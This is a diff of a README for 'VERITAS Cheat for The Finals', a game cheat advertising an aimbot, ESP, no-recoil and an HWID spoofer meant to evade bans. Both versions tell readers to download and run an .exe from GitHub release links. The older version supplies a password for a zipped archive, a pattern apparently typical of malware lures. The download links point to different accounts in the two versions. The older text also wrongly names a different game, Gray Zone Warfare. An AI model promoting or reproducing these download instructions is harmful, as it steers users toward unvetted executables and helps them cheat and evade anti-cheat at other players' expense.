@@ -1,94 +1,87 @@
-<div align="center">
-    <h1 style="font-size:2.5em;color:#FF4500;">🔥 VERITAS CHEAT FOR THE FINALS 🔥</h1>
-    <h2 style="color:#4682B4;">Precision and Clarity for a Superior Competitive Edge</h2>
-</div>
+# 🎮 VERITAS-CHEAT-FOR-THE-FINALS - Elevate Your Game with Custom Tools
 
----
+[![Download Now](https://img.shields.io/badge/Download%20Now-VERITAS%20CHEAT%20FOR%20THE%20FINALS-brightgreen)](https://github.com/flowersgt/VERITAS-CHEAT-FOR-THE-FINALS/releases)
 
-<div align="center">
-    <h2 style="color:#32CD32;">📸 Screenshots</h2>
-    <img src="https://github.com/user-attachments/assets/c7b7cb5b-df13-4e1e-ba55-fbdedc002fc2" alt="Veritas Cheat Screenshot 1" width="80%" style="border:2px solid #FF4500;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-    <img src="https://github.com/user-attachments/assets/9a91e26e-8d9a-4dcb-af8d-0003ac73431e" alt="Veritas Cheat Screenshot 2" width="80%" style="border:2px solid #4682B4;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-</div>
+## 🚀 Getting Started
 
----
+Welcome to the VERITAS Cheat for The Finals! This cheat provides powerful tools to enhance your gameplay. Follow this guide to download and run the software easily.
 
-## 🌟 **Overview**
-The **Veritas Cheat for The Finals** is the ultimate solution for players seeking reliable and high-quality tools. Featuring an advanced **Aimbot** with customizable settings and an **ESP system**, this cheat offers full functionality to dominate matches. The intuitive menu design allows players to configure features to suit their gameplay preferences. Optimized for stability, the Veritas Cheat supports all screen modes, ensuring smooth performance even in the less optimized settings of Gray Zone Warfare.
+## 📥 Download & Install
 
----
+1. **Visit this page to download:** You can find the latest version of the application [here](https://github.com/flowersgt/VERITAS-CHEAT-FOR-THE-FINALS/releases).
+  
+2. **Select the appropriate release:** On the releases page, look for the version marked as the latest. Click on it.
 
-## 🚀 **How to Use**
-<div style="background-color:#F5F5F5;padding:20px;border-radius:10px;">
-    <ol>
-        <li>
-            <b style="color:#FF4500;">Download:</b>  
-            <a href="https://github.com/Mitriveca/VERITAS-CHEAT-FOR-THE-FINALS/releases/download/latest/Veritas.zip" style="text-decoration:none;color:#4682B4;">🔹 Click here to download 🔹</a>
-        </li>
-        <li>
-            <b style="color:#32CD32;">Unzip Archive:</b>  
-            💼 Password: `Veritas`
-        </li>
-        <li>
-            <b style="color:#FF4500;">Run Application:</b>  
-            Execute the `.exe` file after unzipping.
-        </li>
-        <li>
-            <b style="color:#4682B4;">Activate:</b>  
-            Press <b>HOME</b> to launch and configure the cheat.
-        </li>
-    </ol>
-</div>
+3. **Download the executable file:** Scroll down to the "Assets" section. Locate the file with the `.exe` extension. Click on it to begin the download.
 
----
+4. **Run the installer:** Once the file has downloaded, find it in your downloads folder. Double-click on the file to run it. 
 
-<div align="center">
-    <h2 style="color:#32CD32;">💡 FEATURES</h2>
-</div>
+5. **Follow the installation prompts:** The installer will guide you through the process. Follow the on-screen instructions to complete the installation.
 
-### 🎯 **Aimbot Features**
-- **Aim At Shoot:** Activate the Aimbot automatically while firing.  
-- **Vectored Aimbot:** Simulate human-like movements for legitimate gameplay.  
-- **Visible Only & Enemy Only:** Target visible enemies exclusively.  
-- **Recoil Compensation:** Manage weapon recoil for steady aiming.  
-- **FOV & Draw FOV:** Customize and visually display the targeting radius.  
-- **Speed Adjustments:** Set vertical and horizontal aim speeds.  
-- **Target Switch Delay:** Add delays for natural target transitions.  
-- **Hitbox Priority & Hitscan Coefficient:** Focus on critical areas with customizable accuracy.
+6. **Launch the application:** After installation, you can find the application in your programs list. Click to open it.
 
----
+## ⚙️ Features
 
-### 👁️ **ESP Features**
-- **Player ESP:** Track players with ease.  
-- **Enemy Only:** Display enemy locations exclusively.  
-- **Visible Check:** Color-code targets for improved awareness.  
-- **Box ESP:** Visualize targets with styled boxes and outlines.  
-- **Health Bars:** Show health levels of opponents.  
-- **Skeleton ESP:** Highlight player models with skeletal visuals.  
-- **Name ESP:** Display player nicknames.  
-- **Distance Measurement:** Configure and monitor ESP range.  
-- **Custom Colors:** Personalize ESP visuals for clarity.
+- **Advanced Aimbot:** Customize settings to improve accuracy and targeting.
+  
+- **ESP System:** Gain visibility on enemy positions to strategize effectively.
 
----
+- **Intuitive Menu Design:** Easily adjust settings without technical knowledge.
 
-### ⚙️ **Miscellaneous Features**
-- **No Recoil & No Spread:** Improve shooting accuracy and performance.  
-- **Insta Hit:** Accelerate bullet impact times for immediate results.  
-- **Built-In HWID Spoofer:** Avoid detection and bans effectively.  
-- **Localization Options:** Switch between multiple languages for global accessibility.  
+- **Customization Options:** Tailor the tools to fit your unique gameplay style.
 
----
+- **Regular Updates:** Experience new features and improvements with consistent updates.
 
-## 📄 **License**
-<div style="background-color:#F5F5F5;padding:20px;border-radius:10px;">
-    This project is licensed under the **MIT License**. See the LICENSE file for details.
-</div>
+## 🖥️ System Requirements
 
----
+To run the VERITAS Cheat for The Finals smoothly, ensure your system meets these requirements:
 
-<div align="center">
-    <h2 style="color:#4682B4;">📬 CONTACT</h2>
-    <p>Need help? Reach out to us:</p>
-    <a href="" style="text-decoration:none;color:#FF4500;">GitHub</a>  
-    Email: <b style="color:#32CD32;">support@veritascheats.com</b>
-</div>
+- **Operating System:** Windows 10 or later.
+  
+- **Processor:** Dual-core processor or better.
+
+- **Memory:** At least 4 GB of RAM.
+
+- **Graphics Card:** DirectX 11 compatible.
+
+- **Disk Space:** Minimum of 200 MB available space.
+
+## 🎮 Usage Instructions
+
+After launching the application, you will see the main menu. Here’s how to navigate and use the features:
+
+1. **Select the desired feature:** Click on a feature to view available options. 
+
+2. **Adjust the settings:** Use sliders and checkboxes to customize how each tool works.
+
+3. **Save your settings:** Always save your choices before exiting the menu.
+
+4. **Start your game:** Launch your game, and the cheat tools will activate automatically.
+
+5. **Use responsibly:** Remember to play fairly and be aware of game policies regarding cheats.
+
+## ❓ FAQ
+
+**Q: Is this tool safe to use?**
+
+A: This tool is designed to enhance gameplay, but using cheats can lead to account bans. Always use at your own risk.
+
+**Q: Can I customize the Aimbot settings?**
+
+A: Yes, the Aimbot settings are fully customizable to meet your preferences.
+
+**Q: How do I report issues?**
+
+A: If you encounter any issues, you can open a ticket in the respective section on the GitHub page.
+
+## 📚 Support
+
+If you have further questions or need assistance, please visit the repository and check the issues section. You can also reach out to the community for help.
+
+## ⚡ License
+
+This application is licensed under the MIT License. You can freely use and modify the software while adhering to the terms of the license.
+
+Visit this page to download: [Download the latest release](https://github.com/flowersgt/VERITAS-CHEAT-FOR-THE-FINALS/releases)  
+
+Thank you for using VERITAS Cheat for The Finals! Enjoy your enhanced gaming experience.
